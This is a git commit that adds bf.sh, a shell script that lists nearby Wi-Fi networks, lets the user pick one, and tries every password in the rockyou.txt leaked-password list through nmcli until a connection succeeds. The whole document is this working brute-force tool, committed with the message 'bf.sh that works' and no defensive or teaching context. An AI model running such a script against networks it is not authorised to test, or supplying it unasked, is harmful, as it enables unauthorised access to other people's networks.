c2577cd1500615fa13bf0bdba704c8a8fa7fd9bc
Marc Partensky <marc.partensky@gmail.com>
2023-03-15 00:59:16 +0100

    bf.sh that works

---
+++ bf.sh
@@ -0,0 +1,18 @@
+#!/bin/sh
+
+wifi=`nmcli dev wifi list | wofi -d | tr -d '*'`
+ssid=`echo $wifi | awk '{print $1}'`
+name=`echo $wifi | awk '{print $2}'`
+echo Bruteforcing $wifi
+
+# read ssid
+ROCKYOU_PATH=~/Downloads/rockyou.txt
+count=0
+total=`wc $ROCKYOU_PATH | awk '{print $1}'`
+
+while read password
+do
+    count=$(($count+1))
+    echo $count/$total: $password
+    nmcli dev wifi connect $ssid password $password && exit
+done < $ROCKYOU_PATH
